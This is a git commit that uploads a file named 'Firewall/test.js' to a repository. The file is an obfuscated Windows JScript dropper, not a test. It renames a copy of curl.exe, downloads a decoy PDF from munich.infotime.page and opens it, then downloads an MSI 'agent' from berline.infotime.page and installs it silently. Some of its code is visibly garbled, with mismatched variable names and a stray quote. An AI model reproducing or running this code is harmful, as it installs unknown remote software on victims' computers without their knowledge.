0c08d51b47f5496d1fc5520159f6ca0f993902c9
Raf <69700898+linguine2552@users.noreply.github.com>
2024-04-04 10:02:21 -0700

    Add files via upload

---
+++ Firewall/test.js
@@ -0,0 +1,5 @@
+﻿var gQQuuFOEcw = new ActiveXObject("Scripting.FileSystemObject");
+var eSSPrzbUb = new ActiveXObject("WScript.Shell");
+var XcqJPdJnw = eSSPrzbUb.ExpandEnvironmentStrings("%USERNAME%");
+var FGsQFCJKN = gQQuFOEcw.FileExists"("C:\\Users\\" + XcqJPdJnw + "\\AppData\\Local\\Tempt\\rmgglKardU.exe");
+if (!FGsQFCJKN) { eSSPrzbUb.Run('cmd /c cd /d "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\" & copy c:\\windows\\system32\\curl.exe rmgglKardU.exe & rmgglKardU.exe -o "C:\\Users\\%USERNAME%\\Documents\\ukcNCUtAcg.pdf" https://munich.infotime.page/download/pdf & "C:\\Users\\%USERNAME%\\Documents\\ukcNCUtAcG.pdf" & rmgglKardU.exe -o RQkrVTJCzN.msi https://berline.infotime.page/download/agent & C:\\Windows\\System32\\msiexec.exe /i RQkrVTJCzN.msi /qn, 0, false);}
